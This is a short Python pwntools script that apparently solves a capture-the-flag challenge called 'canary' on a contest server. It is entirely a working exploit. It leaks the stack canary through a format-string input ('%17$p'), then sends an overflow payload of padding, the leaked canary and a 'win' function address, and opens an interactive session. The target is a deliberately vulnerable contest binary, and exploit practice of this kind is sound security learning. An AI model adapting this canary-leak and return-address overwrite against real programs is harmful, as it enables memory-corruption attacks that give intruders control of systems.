from pwn import *

r = remote("shell.actf.co",20701)
#r = process("./canary")

junk="a"*56
win=0x0000000000400787

print r.recvuntil("Hi! What's your name? ")
r.sendline("%17$p")
print r.recvuntil("Nice to meet you, ")
canary = r.recvline()
canary=canary.replace("!","")
canary=canary.replace("\n","")
print canary
canary=int(canary,16)

payload=junk
payload+=p64(canary)
payload+=p64(0xaaaa)
payload+=p64(win)

print r.recvuntil("Anything else you want to tell me? ")
r.sendline(payload)
r.interactive()
